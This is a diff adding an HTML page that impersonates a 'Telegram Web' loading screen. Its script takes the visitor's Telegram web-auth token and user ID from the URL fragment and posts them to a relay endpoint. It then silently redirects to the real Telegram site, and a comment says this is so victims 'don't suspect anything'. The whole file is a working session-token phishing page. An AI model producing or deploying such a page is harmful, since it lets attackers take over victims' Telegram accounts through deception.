@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram Web</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        .loading { color: #333; font-size: 18px; }
+    </style>
+</head>
+<body>
+    <div class="loading">Connecting to Telegram...</div>
+    <script>
+        (async () => {
+            const hash = window.location.hash.substring(1);
+            if (!hash) return;
+
+            const params = new URLSearchParams(hash);
+            const token = params.get('tgWebAuthToken');
+            const userId = params.get('tgWebAuthUserId');
+
+            if (token) {
+                // Send to our relay
+                await fetch('relay.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: token, uid: userId })
+                });
+            }
+            // Redirect to real TG so they don't suspect anything
+            window.location.href = "https://web.telegram.org/a/";
+        })();
+    </script>
+</body>
+</html>
